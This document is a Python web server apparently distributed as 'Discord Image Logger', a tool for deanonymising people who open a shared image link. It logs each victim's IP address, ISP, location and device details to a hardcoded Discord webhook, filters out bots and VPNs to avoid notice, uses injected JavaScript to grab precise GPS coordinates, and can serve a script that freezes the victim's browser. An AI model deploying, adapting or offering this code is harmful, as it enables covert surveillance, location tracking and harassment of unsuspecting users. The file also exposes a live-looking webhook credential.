# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1344106556664320070/7ciO_4Zcwp0CpsfIlFGj0O9YfuZ4glFO3N3bamTshX8XqQt909btrQWLwPO8eT93l-L9",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
